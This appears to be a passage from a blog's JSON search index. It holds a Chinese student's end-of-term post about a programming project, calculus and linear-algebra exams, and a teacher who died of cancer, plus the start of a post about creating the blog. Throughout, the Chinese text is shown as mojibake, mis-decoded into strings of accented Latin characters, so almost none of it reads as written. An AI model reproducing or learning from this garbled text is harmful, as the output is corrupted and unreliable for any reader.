ä¸ºæ²¡æœ‰æ»¡ç»©ç‚¹è€Œéš¾è¿‡å•Šï¼Ÿ**\n\nç¨‹åºè®¾è®¡æˆ‘çš„å¤§ä½œä¸šæ‹¿åˆ°äº†æœ€é«˜åˆ†ï¼ˆ92åˆ†çš„é‚£ä¸€é¡¹ï¼Œå…¶å®åº”è¯¥æ˜¯96åˆ†ï¼Œæˆ‘æŠŠæˆ‘çš„4åˆ†åˆ†äº«ç»™äº†æˆ‘çš„ç»„å‘˜ï¼‰ï¼Œé‚£ä¸ªä¸œè¥¿æ‰æ˜¯æˆ‘æ”¶è·æœ€å¤§çš„ã€‚å°±è¿™ä¸ª[è‡ªå·±å­¦ç€å†™çš„å›¾ä¹¦ç®¡ç†ç³»ç»Ÿï¼ŒAIå†™æ¡†æ¶ï¼Œè‡ªå·±å¡«åŠŸèƒ½ä¿®bug](https://github.com/Moyuin-aka/LibrarySystem_HNU_InformationSecurity2024_2401)ã€‚è¿™ä¸ªé¡¹ç›®æˆ‘å­¦åˆ°çš„ä¸œè¥¿ï¼Œæˆ‘å­¦ä¼šäº†gitæ€ä¹ˆç”¨ï¼Œè‡ªå·±çŸ¥é“äº†markdownå†™æŠ¥å‘Šï¼Œæˆ‘è¿˜å­¦äº†ç‚¹cmakeï¼Œç”šè‡³æˆ‘æƒ³å»å°è¯•ä¸€ä¸‹sqlæ•°æ®åº“ï¼Œææ‡‚äº†ä¸åŒç¯å¢ƒä¸‹çš„æ½œåœ¨çš„ä¸­æ–‡ä¸å…¼å®¹æ€§ï¼Œç„¶åè‡ªå·±å‡­ç€å…´è¶£åˆ›äº†è¿™ä¸ªåšå®¢...è™½ç„¶å¾®ä¸è¶³é“ï¼Œä½†è¿™äº›ä¸œè¥¿æ¯”èµ·æ‹¿ç€ç”µè„‘è¿·è¿·ç³Šç³Šå»ååœ¨é‚£é‡Œä¸Šè¯¾çœ‹ç€è€å¸ˆè®²ä¸€å¤§å¨ä¸œè¥¿å‘å‘†ï¼Œç„¶ååˆ·ç€ojå»è‡ªå­¦,åœ¨å®è·µæ„ä¹‰ä¸Šï¼Œæœ‰ç”¨çš„å¤šå¾—å¤šäº†ã€‚\næˆ‘å·²ç»æ”¶è·åˆ°äº†æˆ‘è¦å­¦çš„ä¸œè¥¿ï¼Œæˆ‘åªæ˜¯åœ¨åé—®è‡ªå·±ï¼š**æˆ‘ä¸ºä»€ä¹ˆå› ä¸ºæˆç»©è¦éš¾è¿‡å•Šï¼Ÿ**\næˆ‘åªæ˜¯æƒ³å‘Šè¯‰è‡ªå·±å§ï¼Œæˆ‘å¾ˆä¼˜ç§€ã€‚ä½†æˆ‘åº”è¯¥è‡ªå·±ä¹Ÿè¦çŸ¥é“æˆ‘å·²ç»å¾ˆä¼˜ç§€äº†...**ä¸éœ€è¦é ç€æ»¡ç»©**æ¥è¯æ˜è‡ªå·±ä¼˜ç§€...æˆ‘æ²¡å¿…è¦å—ç€ä¼˜ç»©ä¸»ä¹‰çš„å‹åŠ›ä¸‹ï¼Œ**æ²¡å¿…è¦ä¹Ÿä¸åº”è¯¥**å°†å¤§å­¦åˆè¿‡æˆä¸€ä¸ªä¸ºåˆ†æ•°ç„¦è™‘çš„é«˜ä¸­ï¼Œç¼–ç¨‹æ˜¯æˆ‘ä¸€ç›´æƒ³å­¦çš„ä¸œè¥¿ï¼Œå…´è¶£ä¼šé©±åŠ¨æˆ‘ç»§ç»­å‘å‰èµ°çš„ã€‚\n\nä¸€åˆ‡å°˜åŸƒè½å®šäº†ã€‚\nåˆä¸æ˜¯æŒ‚ç§‘ã€‚åˆä¸ç”¨é‡æ–°è€ƒã€‚æˆ‘å­¦å®Œäº†ï¼Œæˆ‘å¯ä»¥å»å­¦ä¸‹ä¸€é—¨äº†ã€‚\nä¸“å¿ƒï¼Œä¸‹ä¸€é—¨å§ã€‚å¿ƒå®šã€‚\n\n## **æœŸæœ«å¤ä¹ å¥½ç´¯ï¼ï¼** é«˜æ•°\n*å“ˆå“ˆï¼Œä½†æ˜¯ï¼æˆ‘è€ƒå®Œäº†ï¼ï¼*\n\né«˜æ•°å¥½éš¾ï¼Œæˆ‘ä¼šçš„ä¸œè¥¿æˆ‘è¿˜ç®—é”™äº†ï¼ï¼æˆ‘è¿è®¾å¾®åˆ†æ–¹ç¨‹ç‰¹è§£éƒ½ä¸‹æ„è¯†è®¾é”™äº†ï¼ï¼ç§¯åˆ†æˆ‘è¿˜æ¼é¡¹äº†ï¼ï¼ï¼ˆé‚£ä¸ªç§¯åˆ†å¥½éš¾ï¼ï¼ï¼‰æˆ‘ç¬¬ä¸€é¢˜æ±‚æ¸è¿‘çº¿éƒ½å¿˜è®°æ€ä¹ˆæ±‚äº†ï¼ï¼é‚£ä¸ªç ´ä¼ªè£…æˆç§¯åˆ†é¢˜çš„ç‰©ç†é¢˜æˆ‘ä¹Ÿå—å¤Ÿäº†ï¼ï¼æˆ‘åˆ—å‡ºäº†ç®—å¼ï¼Œä½†æˆ‘ç®—å¼å¥½åƒæœ‰ç‚¹é—®é¢˜å‘€ï¼ï¼\n\n*è™½ç„¶è€ƒæˆäº†ä¾æ‰˜æ„å¼ï¼Œä½†æ˜¯å·²ç»è€ƒå®Œäº†ï¼ï¼*\n\n**å·²ç»è€ƒå®Œäº†ï¼Œå°±ä»£è¡¨ç€ä¸€åˆ‡ç»“æŸäº†ï¼å¯¹å§ï¼ï¼ï¼ï¼**\nå¤§å®¶éƒ½è¯´é«˜æ•°éš¾æˆ‘å°±æ”¾å¿ƒäº†ï¼Œè¿™ä¸€é—¨å¿ƒå¹³æ°”å’Œå§ã€‚\n\nè™½ç„¶æˆ‘çŸ¥é“æˆ‘çš„æ•°å­¦ä¸€ç›´éƒ½æ˜¯è¿™æ ·ï¼Œ**ä»åˆä¸­å¼€å§‹æˆ‘çš„æ•°å­¦å°±æ˜¯ä¸€å¨**...ä½†æ„Ÿè§‰å¤§å­¦çš„é«˜æ•°ç†è§£äº†æ¦‚å¿µåå†™ä¸œè¥¿åˆ·é¢˜å…¶å®éƒ½å·®ä¸å¤šï¼Œç”šè‡³å› ä¸ºæ²¡æœ‰å¾ˆå¤šæ€ç»´æ‹“å±•ç±»çš„ä¸œè¥¿åè€Œè¿˜æ›´ç®€å•ç‚¹ï¼Œå”¯ä¸€éš¾ç‚¹å¯èƒ½å°±æ˜¯ç§¯åˆ†ä½ ä¸çŸ¥é“æ€ä¹ˆå‡‘å§...\n\næˆ‘ä¹Ÿä¸çŸ¥é“è‡ªå·±æ˜¯æ•°å­¦åˆ†ææ€ç»´è–„å¼±è¿˜æ˜¯å’‹ï¼Œæˆ‘å¾ˆéš¾æŠŠé—®é¢˜æ•°å­¦åŒ–ï¼Œé™¤éæˆ‘è‡ªå·±åˆ·è¿‡å¾ˆå¤šé¢˜ç„¶åé¡ºç€é¢˜æ¥å°±ç€å†™æ€è·¯...è¿˜å¥½ï¼Œå¤§å­¦è¿™æ ·å†™åº”ä»˜æœŸæœ«è€ƒè¯•ä¹Ÿå¤Ÿäº†ã€‚\næˆ‘è‡ªå·±è®¤ä¸ºæˆ‘ç»å¯¹ä¸æ˜¯æ•°å­¦å¼ºçš„äººï¼Œå°±æ˜¯å› ä¸ºè¿™ä¸€ç‚¹...ä½†ä¸ä»£è¡¨æˆ‘æ•°å­¦å¼±å•Šï¼Œä¼šå†™çš„è®¡ç®—é¢˜æˆ‘è¿˜æ˜¯æ¨çš„å‡ºæ€è·¯çš„ï¼Œè¿™æ¬¡å¤§å®¶éƒ½è¯´éš¾çš„ä¸å®šç§¯åˆ†å’Œå®šç§¯åˆ†æˆ‘éƒ½æ±‚å‡ºæ¥äº†ï¼ˆè™½ç„¶ä¸å®šç§¯åˆ†æ¼äº†ä¸€ä¸ªå¸¸æ•°é¡¹ï¼Œè¢«è‡ªå·±æ— è¯­åˆ°äº†ï¼‰ï¼Œæˆ‘ä¸çŸ¥é“è¿™å±äºä»€ä¹ˆæ–¹é¢çš„æ•°å­¦èƒ½åŠ›....\nä¸å¤ªé€‚åˆæ•°å­¦å®è·µå’Œåšé¢˜åˆ›æ–°ï¼Œä½†å½“ä¸ªåšé¢˜çš„è®¡ç®—å™¨è¿˜æ˜¯å¾ˆä¸é”™çš„ï¼\n\nå°±è¿™æ ·å§ï¼Œç¾¤é‡Œå¤§å®¶éƒ½åœ¨å‘*è€å¸ˆèœèœææ*ï¼Œæˆ‘æ²¡å‘ï¼Œç®—äº†ç®—ï¼Œå…¶å®å†™å¯¹çš„ä¹Ÿåº”è¯¥æœ‰60åˆ†äº†...ä¹Ÿæ²¡å¿…è¦ä¸ºäº†åˆ†æ•°å»æ±‚æƒ…å•¥çš„ï¼Œæ²¡æœ‰å“ªä¸ªè€å¸ˆä¼šçœ‹åˆ°å­¦ç”Ÿ59åˆ†ä¸ææå¤šç»™ç‚¹å¹³æ—¶åˆ†å§ï¼Ÿï¼ˆæ¯•ç«Ÿå­¦ç”Ÿä¸åŠæ ¼é‚£éº»çƒ¦äº‹å¯å¤ªå¤šäº†...ï¼‰\né™å€™ã€‚\n\n## **çº¯è‡ªå­¦åˆ°æœŸæœ«å‘ç°å•¥ä¹Ÿä¸ä¼šæ€ä¹ˆåŠï¼** çº¿ä»£\n*æ²¡å…³ç³»ï¼Œçº¿ä»£é€Ÿæˆè¯¾æ•‘ä½ ç‹—å‘½...[æ¨èæ¡†æ¡†è€å¸ˆ...](https://www.bilibili.com/video/BV1Ey4y147xn/)*\n\n### å…³äºçº¿ä»£æœŸæœ«\n\nå­¦æœŸå¼€å¤´çº¿ä»£è€å¸ˆçš„æµ“åšæ¹–å—å†œæ‘å£éŸ³å°±ç»™æˆ‘æ¥äº†å½“å¤´ä¸€æ£’ï¼Œè¿™æ˜¯**å¯¼ç«ç´¢**ã€‚\nçº¿ä»£æ•™æç¼–çš„ä¸€å¨æ ¹æœ¬çœ‹ä¸æ‡‚åœ¨è®²ä»€ä¹ˆï¼Œè¿™æ˜¯**ç›´æ¥åŸå› **ã€‚\nç„¶åæˆ‘å°±èµ°ä¸Šäº†çº¿ä»£çº¯è‡ªå­¦çš„é“è·¯...ä¸Šè¯¾ï¼Ÿå‘¨å››çš„æ—©å…«ï¼Œæœ¬æ¥å°±ä¸æƒ³å»ä¸Šè¯¾ï¼Œè¿˜æ˜¯æ—©å…«ï¼Œéå¸¸æ²¡æœ‰æ¿€æƒ…...\næ¯å¤©å‘¨ä¸‰æ™šä¸Šéƒ½è¦ç»æœ›åœ°æƒ³åˆ°æ˜å¤©æ˜¯**çº¿ä»£å‘¨å››æ—©å…«**ã€‚\n\næœ¬æ¥çœ‹çš„æ˜¯[ä¸€é«˜æ•°](https://www.bilibili.com/video/BV1Et421E7jk/)è€å¸ˆçš„è‡ªå­¦è¯¾ï¼Œè€å¸ˆè®²çš„éå¸¸å¥½ï¼Œ<small>*ä¸ºæˆ‘çš„4å°æ—¶é€Ÿæˆæ‰“ä¸‹äº†åšå®çš„åŸºç¡€...*</small>ï¼Œå”¯ä¸€çš„ç¼ºç‚¹å¯èƒ½å°±æ˜¯æ¶‰åŠé¢˜å‹æ¯”è¾ƒå°‘ï¼Œå¯¼è‡´æˆ‘å¤§å¤šæ•°æ˜¯æ‡‚äº†å…¬å¼æ€ä¹ˆç”¨...\nåæ¥å®åœ¨è§‰å¾—æˆ‘ä¸ç†è§£çº¿æ€§ä»£æ•°è¿™ç©æ„ï¼Œç‰¹åˆ«æ˜¯å‘é‡ç©ºé—´é‚£ä¸€ç« èŠ‚ï¼Œæˆ‘åˆå°è¯•ç”¨[Gilbert Strang](https://www.bilibili.com/video/BV16Z4y1U7oU)è¿™ä½MITæ•™æˆçš„è¯¾æ¥è¾…åŠ©æˆ‘ç†è§£...å—¯ï¼Œç†è§£äº†ï¼Œç»“åˆGeogebraçš„3Dè®¡ç®—å™¨ï¼Œæˆ‘å€’æ˜¯çŸ¥é“é‚£ä¸€å †è«åå…¶å¦™çš„å…¬å¼æ˜¯æ€ä¹ˆæ¥çš„äº†...ä¹Ÿå¯¹çº¿ä»£æ˜¯ä¸ªå‡ ä½•çš„ä¸œè¥¿æœ‰äº†ä¸€ç‚¹ç‚¹æ¨¡ç³Šçš„æ¦‚å¿µï¼Œæ›´èƒ½ç†è§£çŸ©é˜µäº†...\n**ç„¶åæˆ‘å¼€å§‹åšå¾€å¹´æœŸæœ«é¢˜ï¼Œç„¶åæ‚²ä¼¤åœ°å‘ç°ï¼Œè¿™å¯¹æˆ‘çš„æœŸæœ«è€ƒè¯•ä¸å¤ªæœ‰ä½œç”¨ã€‚**\næˆ‘åªæ˜¯åœ¨ç†è§£çº¿ä»£ï¼Œä½†æ˜¯æœŸæœ«è€ƒè¯•å‘Šè¯‰æˆ‘ï¼Œæˆ‘éœ€è¦åšé¢˜ï¼Œéœ€è¦è®°å¾—é‚£äº›ä¸œè¥¿æ¥åšé¢˜ï¼Œéœ€è¦å˜æ¢æˆæˆ‘ç†Ÿæ‚‰çš„å½¢å¼åšé¢˜ã€‚\n**ç„¶åæˆ‘æŠ•é™äº†...åƒæ— æ•°ä¸ªæŠ±ä½›è„šçš„å­¦ç”Ÿä¸€æ ·ï¼Œæˆ‘æ‰“å¼€äº†4å°æ—¶é€Ÿæˆè¯¾ç¨‹ï¼Œå¼€å§‹çœ‹é¢˜å‹ï¼Œè§£é¢˜æŠ€å·§...** [è¿™æ˜¯æˆ‘çš„åšé¢˜ç¬”è®°ç‹¼ç‹ˆç—•è¿¹](https://1drv.ms/o/c/710350be48682818/EuYPgNiLM95FmpclHifiq_MBPq2eDeFJHwAVrwKt7TJOKw?e=SwqLuM)\nè¿˜å¥½ï¼Œç»“å±€æ˜¯å¥½çš„ã€‚ä¹Ÿè®¸æˆ‘ç¡®å®å¹¸è¿ï¼Œçº¿ä»£è€ƒçš„å¾ˆç®€å•ï¼Œæˆ‘ç”šè‡³æå‰ä¸€å°æ—¶å°±å†™å®Œäº†ï¼ˆéƒ½æ˜¯æˆ‘çœ‹çš„é€Ÿæˆè¯¾çš„é¢˜ç›®ï¼Œåšçš„ç›¸å½“å¿«ï¼‰ï¼Œç„¶åå‰©ä¸‹ä¸€å°æ—¶å°±æ˜¯åå¤é‡æ–°ç®—è¡Œåˆ—å¼å’ŒçŸ©é˜µä¹˜æ³•ï¼Œç”Ÿæ€•ç®—é”™...æœ€åå®åœ¨ç®—äº†åéåç¡®è®¤æ— è¯¯åï¼Œæå‰ååˆ†é’Ÿäº¤å·äº†ã€‚\n\næˆ–è®¸è¿™çº¿ä»£ä¸­æˆ‘çš„è¡¨ç°å°±åƒæˆ‘ä¹‹å‰çœ‹åˆ°çš„é‚£ä¸€å¥è¯ä¸€æ ·å§ã€‚â€œä¸­å›½å¤§å­¦ç”Ÿçš„æœŸæœ«ï¼Œå°±æ˜¯ä¸€ä¸ªå­¦æœŸçš„åŠªåŠ›ï¼Œè€ƒå‰å‡ å¤©çš„ç„¦è™‘ï¼Œè€ƒå‰ä¸€å¤©çš„é€Ÿè®°å’Œè€ƒåœºä¸Šçš„çœ‹è¿æ°”ã€‚â€\nå“ˆå“ˆï¼Œåˆçœ‹åˆ°ä¸€å¥â€œå‰åä¸ƒå‘¨å‘Šè¯‰ä½ æˆ‘æ˜¯å¤§å­¦ç”Ÿï¼Œç¬¬åå…«å‘¨å‘Šè¯‰ä½ æˆ‘ä¸ºä»€ä¹ˆæ˜¯å¤§å­¦ç”Ÿã€‚â€\n\nä¸è¿‡ä¸€å¤©å¤ä¹ ä¸€é—¨è¿˜æ˜¯ç‰¹åˆ«ç´¯çš„...åä¸€ç‚¹é«˜æ•°è€ƒå®Œï¼Œç¡åˆ°ä¸‹åˆä¸¤ç‚¹<small>(*å¤§å­¦ç”Ÿç‰¹æœ‰çš„ç‰¹çˆ±ç¡è§‰*)</small>ã€‚ç„¶åæ‰“å¼€æ‰‹æœºï¼Œç„¦è™‘åˆ·æ‰‹æœºï¼Œçœ‹åˆ°æœ‰äººæ¨èè¯¾ç¨‹ï¼Œç„¶åä¸‹åˆå››ç‚¹å¼€å§‹çœ‹ï¼Œèµ°èµ°åœåœå­¦åˆ°æ™šä¸Šåä¸€ç‚¹...\nè¿˜æ˜¯å¾ˆå¥‡å¦™çš„ï¼ŒçŸ­çŸ­äº”å°æ—¶çš„è¯¾ç¨‹çŸ¥è¯†é‡å¸æ”¶é‚£ä¹ˆå¤šï¼Œå­¦ä¹‹å‰æ˜¯çº¿æ€§æ–¹ç¨‹ç»„éƒ½ä¸çŸ¥é“æ€ä¹ˆæ±‚è§£çš„èœé¸¡ï¼Œå­¦ä¹‹åæˆ‘éƒ½å¯ä»¥æé†’å®¤å‹å¤ä¹ é—æ¼çš„ä¸œè¥¿äº†...å‹åŠ›æœç„¶è¿˜æ˜¯è¶³ä»¥é©±åŠ¨æ‡’äººçš„ä¸å¯æˆ–ç¼ºçš„åŠ›å•Šã€‚\n\n### å…³äºçº¿ä»£è€å¸ˆ...\n#### æ¶\nå…¶å®ä¸€å¼€å­¦æˆ‘å¬ç€è€å¸ˆ*äº²åˆ‡çš„*ä¹¡éŸ³æˆ‘è¿˜æ˜¯å¾ˆæŠµè§¦çš„...ç­ä¸Šå¤–çœçš„åŒå­¦ç«‹é©¬åé¦ˆæ ¹æœ¬å¬ä¸æ‡‚è€å¸ˆè®²è¯¾ï¼Œæˆ‘å€’æ˜¯å¬å¾—æ‡‚ï¼Œä½†æ˜¯ä»–è®©æˆ‘æƒ³èµ·æˆ‘å°å­¦ä¸€ä½æ•°å­¦è€å¸ˆï¼Œç”¨æ–¹è¨€è®²è¯¾...ç„¶åé‚£ä¸€æ¬¡å°å­¦çš„æ•°å­¦æˆç»©å°±å¼€å§‹æ€¥è½¬ç›´ä¸‹ï¼Œåˆå¦‚è´è¶æ•ˆåº”ä¸€èˆ¬å½±å“åˆ°äº†ä»¥åçš„æ•°å­¦å­¦ä¹ å…´è¶£...åŠ ä¸Šè€å¸ˆå¼€å­¦ç¬¬ä¸€è¯¾å°±æ˜¯å¿µpptï¼Œä¹Ÿä¸è®²åŸç†ï¼Œæˆ‘ä¹Ÿçœ‹ä¸æ‡‚çº¿ä»£æ•™æçš„å¼€å±€è¡Œåˆ—å¼æ€ä¹ˆæ¥çš„...å­¦å®Œä¸€èŠ‚è¯¾æˆ‘æ„Ÿè§‰è·Ÿæ²¡å­¦ä¸€æ ·ï¼Œè®©æˆ‘å†…å¿ƒè¿˜æ˜¯å¾ˆæŠµè§¦çš„ã€‚åŒå±‹åŠä¹Œä¸€èˆ¬ï¼Œå¯¹çº¿ä»£ä¸æ„Ÿå†’äº†ï¼Œè§‰å¾—å­¦çº¿ä»£æ˜¯ä¸€ä»¶å¾ˆç—›è‹¦çš„äº‹æƒ…...ç„¶åä¹Ÿè§‰å¾—è€å¸ˆæ€ä¹ˆè¿™æ ·ï¼Œç„¶åå¯¹è€å¸ˆä¹Ÿæœ‰äº†åè§...\n**å…¶å®ä¸ä»…æˆ‘è¿™æ ·ï¼Œå¤§å®¶ä¼¼ä¹ä¹Ÿæ˜¯è¿™æ ·ã€‚**\næˆ‘ç»å¸¸çœ‹æ ¡å›­é›†å¸‚ï¼Œèƒ½çœ‹åˆ°å¾ˆå¤šäººçš„æ±‚åŠ©å¸–ï¼Œå…¶ä¸­å¾ˆå¸¸è§çš„å°±æ˜¯å…³äºè€å¸ˆé€‰æ‹©çš„æ±‚åŠ©å¸–ã€‚**æˆ‘çœ‹è§æœ‰äººè¯¢é—®çº¿ä»£è€å¸ˆæ¨è**ï¼Œæˆ‘æœ¬æ¥æƒ³å›å¤ä¸€ä½æˆ‘è§‰å¾—æ•™å­¦æ°´å¹³å¾ˆé«˜è¶…ï¼Œè®²è§£å¾ˆå®¹æ˜“ç†è§£çš„è€å¸ˆ<small>ï¼ˆç»™æ¥HNUçš„å­¦ç”Ÿæ¨èä¸€ä¸‹ï¼Œæ˜¯æœ±éƒæ£®è€å¸ˆï¼‰</small>,ä½†æ˜¯çœ‹è§è¯„è®ºåŒºåƒä¹å­äººä¸€èˆ¬æ¨èæˆ‘çš„è¿™ä½çº¿ä»£è€å¸ˆçš„æ—¶å€™...å…¶å®å†…å¿ƒå¾ˆå¤æ‚ã€‚ä¸€æ–¹é¢ï¼Œæ˜¯æˆ‘è§‰å¾—ä»–ä»¬å¾ˆåï¼Œç»™ä¸€ä¸ªæ±‚åŠ©å¸–æ¨èè¿™ä½è®²è¯éƒ½è®©äººå¬ä¸æ‡‚çš„è€å¸ˆ...å¦ä¸€æ–¹é¢ï¼Œæˆ‘ä¹Ÿå¿ƒé‡Œé»˜è®¤äº†ï¼Œè¿™ä½è€å¸ˆ==å·®è€å¸ˆã€‚\n**äººæ˜¯ä¼šè¢«èˆ†è®ºä¸€ç›´å½±å“ä¸‹å»çš„ï¼Œè¿™æ˜¯ä¸€ä»¶å¾ˆææ€–çš„äº‹æƒ…ã€‚**\næˆ‘ä¸€å¼€å§‹åªæ˜¯å¯¹è€å¸ˆæœ‰ä¸€ç‚¹ç‚¹çš„ä¸ä¿¡ä»»ï¼Œä½†æ— ä¼¤å¤§é›…ï¼Œè¿™ä¸å½±å“æˆ‘æ¥ä¸Šè¯¾çš„å¿ƒæƒ…ã€‚**ä½†æ˜¯çœ‹åˆ°å¤§å®¶éƒ½è¯´è¿™ä¸ªè€å¸ˆæå·®çš„æ—¶å€™ï¼Œæˆ‘è¿˜æ˜¯è¢«èˆ†è®ºç‰µç€èµ°äº†ã€‚**\næˆ‘ä¹ŸåŠ å…¥äº†è¯„ä»·çš„å¤§ä¼—é‡Œï¼Œæˆ‘å¯¹è€å¸ˆçš„æ¶æ„è¿›ä¸€æ­¥äº†ã€‚\næˆ‘ä¹Ÿå¼€å§‹éšæ³¢é€æµï¼Œä¸€åŒæ”»å‡»è¿™ä½è€å¸ˆã€‚æˆ‘å‘å®¤å‹æ˜é‡Œæš—é‡Œåœ°æŠ±æ€¨è€å¸ˆå®åœ¨æ˜¯å¤ªå·®ï¼Œå½±å“äº†æˆ‘çš„çº¿ä»£å­¦ä¹ ...ç”šè‡³æˆ‘ä¸Šè¯¾çš„åŠ¨åŠ›ä¹Ÿè¢«å½±å“ï¼Œä¸€çœ‹åˆ°é‚£ä½è€å¸ˆçš„åå­—å°±æ„Ÿè§‰ä¸èˆ’æœ...\n\n**ä½†æ˜¯ï¼ŒçœŸçš„æ˜¯è¿™æ ·å—ï¼Ÿè¿™ä½è€å¸ˆï¼Œå®åœ¨æ˜¯ä¸å ªå—ï¼Ÿè¿™ä½è€å¸ˆï¼Œæ˜¯æˆ‘æœŸæœ«çº¿ä»£ä¸ä¼šå†™çš„å…ƒå‡¶å—ï¼Ÿ**\n\n**<big>å‚²æ…¢å‚¬ç”Ÿé€€æ­¥ï¼Œè¿™æ˜¯ä¸ªå¾ˆç®€å•çš„é“ç†ã€‚</big>**\n\n#### æ¸…é†’\nä¸€åˆ‡åªæ˜¯å‘ç”Ÿåœ¨ä¸€ä¸ªä¸Šåˆã€‚å…ƒæ—¦ä¹‹åï¼Œæˆ‘çš„ï¼ˆéåŒä¸“ä¸šï¼‰å®¤å‹çªç„¶é—®æˆ‘ï¼šâ€œä½ çŸ¥é“ä½ æ¯å¤©æŠ±æ€¨çš„é‚£ä¸ªçº¿ä»£è€å¸ˆå»ä¸–äº†å—ï¼Ÿâ€\nä¸€åˆ‡å¤ªçªç„¶ï¼Œæˆ‘æ ¹æœ¬æ²¡æœ‰æ€æƒ³å‡†å¤‡ã€‚åœ¨æˆ‘çš„è®¤è¯†é‡Œï¼Œè€å¸ˆåªæ˜¯è¯·äº†ä¸¤å‘¨çš„å‡ï¼Œæˆ‘æ ¹æœ¬ä¸çŸ¥é“ï¼Œä¹Ÿæ²¡æœ‰å»åœ¨ä¹è€å¸ˆçš„èº«ä½“çš„èº«ä½“çŠ¶æ€ã€‚\nå’Œæˆ‘ä¸€èµ·ä¸Šè¯¾çš„å®¤å‹å‘Šè¯‰æˆ‘ï¼Œå¥¹å‘ç°è€å¸ˆä¸Šä¸€æ¬¡çš„è¯¾å°±å¾ˆä¸å¯¹åŠ²äº†ï¼Œå¹³æ—¶è¯´è¯ä¸€æƒŠä¸€ä¹çš„å¾ˆå¤§å£°çš„è€å¸ˆï¼Œé‚£ä¸€æ¬¡ä¸Šè¯¾å´ä¸€ç›´ååœ¨è®²å°æ—çš„å‡³å­ä¸Šï¼Œå£°éŸ³ä¹Ÿå¾ˆå°ï¼Œå¥¹æ ¹æœ¬å¬ä¸æ¸…ã€‚å¤§å®¶éƒ½ä»¥ä¸ºè€å¸ˆåªæ˜¯åœ¨è¿™æµæ„Ÿå¤šå‘çš„å­£èŠ‚ç”Ÿäº†æµæ„Ÿï¼Œè¿™ä¸€åˆ‡å¾ˆæ­£å¸¸ï¼Œæˆ‘ä»¬éƒ½çŸ¥é“ï¼Œè€å¸ˆåœ¨æ„Ÿå†’å¥½äº†ä¹‹åå°±ä¼šå›æ¥ç»§ç»­æ•™å­¦çš„ï¼Œç„¶å**æˆ‘ä»¬ä¼šç»§ç»­è¿‡ç€è‡ªå­¦å¬çº¿ä»£çš„æ—¥å­**ã€‚\n\nä½†æ˜¯ä¸å¯èƒ½äº†ã€‚åŠ©æ•™æ­£å¼å‘æ¥é€šçŸ¥ã€‚\n![åŠ©æ•™è¯´](/images/tired/çº¿ä»£åŠ©æ•™é€šçŸ¥.png)\n![å­¦ç”Ÿä¸å¦ä¸€ä½è€å¸ˆçš„èŠå¤©è®°å½•](/images/tired/å‘¨è€å¸ˆå»ä¸–.jpg)\n\nå…¶å®çŸ¥é“çš„é‚£ä¸€ç¬é—´ï¼Œæˆ‘å°±æ¸…é†’èµ·æ¥äº†ã€‚\næˆ‘æƒ³åˆ°æˆ‘çš„å®¤å‹è·Ÿæˆ‘è¯´çš„è¯ã€‚â€œæˆ‘è§‰å¾—å‘¨è€å¸ˆå…¶å®æ²¡æœ‰é‚£ä¹ˆå·®ï¼Œä»–å¾ˆå¥½çš„ã€‚â€è¿‡å»æˆ‘è¢«å‚²æ…¢çš„è®¤çŸ¥ç»™è’™è”½ï¼Œæ²¡æŠŠè¿™å¥è¯å½“å›äº‹ï¼Œä½†ç°åœ¨æˆ‘å´èƒ½æ¸…æ™°æƒ³èµ·æ¥è¿™å¥è¯ã€‚\n**ä¸ºä»€ä¹ˆï¼Ÿ**\næˆ‘è¿™ä¹ˆé—®è‡ªå·±ã€‚\næˆ–è®¸ï¼Œæ˜¯æ¸…é†’äº†å§ã€‚\nçŠ¹å¦‚è¢«æµ‡ä¸Šä¸€ç›†å†·æ°´ï¼Œæ‰€æœ‰äººéƒ½å¼€å§‹å®¡è§†è‡ªå·±äº†ã€‚ä¹Ÿè®¸æ˜¯æ­»è€…ä¸ºå¤§å¸¦æ¥çš„å½±å“ï¼Œä¹Ÿè®¸æ˜¯çœŸçš„è®¤è¯†åˆ°äº†è‡ªå·±è¿‡å»çš„é”™è¯¯...\nä½†ä¸ç®¡æ€ä¹ˆæ ·ï¼Œå¤§å®¶éƒ½æ¸…é†’äº†ã€‚\n**ä½†ä¸ç®¡æ€ä¹ˆæ ·ï¼Œå‘¨è€å¸ˆå·²ç»ä¸åœ¨äº†ã€‚**\n\näººæ€»æ˜¯è¢«èˆ†è®ºç‰µç€èµ°ï¼Œæ‰“ç ´è¿™ä¸ªå±€é¢çš„ï¼Œå¾€å¾€æ˜¯åƒè¿™æ ·ï¼Œæ­»ç”Ÿä¸€èˆ¬é‡å¤§çš„äº‹æƒ…ã€‚\n**äººï¼Œè¦æœ‰è‡ªå·±çš„åˆ¤æ–­ã€‚äººï¼Œè¦æ¸…é†’ä¸‹å»ã€‚**\nè¿™ä¹Ÿæ˜¯å‘¨è€å¸ˆçœŸæ­£ç»™æˆ‘ä¸Šçš„ï¼Œæˆ‘åœ¨çº¿ä»£è€å¸ˆä¸­å”¯ä¸€çœŸæ­£å­¦åˆ°çš„ï¼Œä¹Ÿæ˜¯æˆ‘ä¸€ç”Ÿä¸­æˆ–è®¸å­¦åˆ°çš„æœ€é‡è¦çš„é“ç†ã€‚\n\næœ€åï¼Œé™„ä¸Šä¸€ä½å‘¨è€å¸ˆå­¦ç”Ÿçš„æ‚¼å”å§ã€‚\n![ä¸€ä½å‘¨è€å¸ˆçš„å­¦ç”Ÿ](/images/tired/å‘¨è€å¸ˆå­¦ç”Ÿ.png)\næ„¿å¤§å®¶éƒ½å¹³å®‰é¡ºé‚ï¼Œæ„¿ç™Œç—‡ä¸å†å¸¦å»ä»»ä½•ä¸€ä¸ªäººçš„ç”Ÿå‘½ã€‚\nå‘¨è€å¸ˆï¼Œä¸€è·¯èµ°å¥½ã€‚","tags":["ç¼–ç¨‹","æ‚è°ˆ","æœŸæœ«"],"categories":["æ‚è°ˆ"]},{"title":"ç¬¬ä¸€ç¯‡","url":"/2025/01/10/sheng-huo/ji-lu/di-yi-pian/","content":"çªå‘å¥‡æƒ³ï¼Œå¤§åŠå¤œçš„ï¼Œç‚¹å¼€äº†ä¸€ä½å­¦é•¿çš„åšå®¢ï¼Œç„¶åæƒ³ç€è‡ªå·±ä¹Ÿèƒ½ä¸èƒ½å†™ä¸€ä¸ªåšå®¢...ç„¶åå°±è¿™æ ·è·Ÿç€æ•™ç¨‹å¼€å§‹äº†ã€‚\n\nå¯èƒ½æœ‰äººè¯´ï¼Œæˆ‘æ€ä¹ˆåŠå¤œä¸‰ç‚¹çªç„¶è¯´è¦å†™ä¸ªåšå®¢ï¼Œè¿˜è¦æ­ä¸ªç½‘ç«™...ï¼Œæˆ‘åªèƒ½è¯´ï¼Œæœ‰æ—¶å€™äººå°±æ˜¯è¿™ä¹ˆæ— 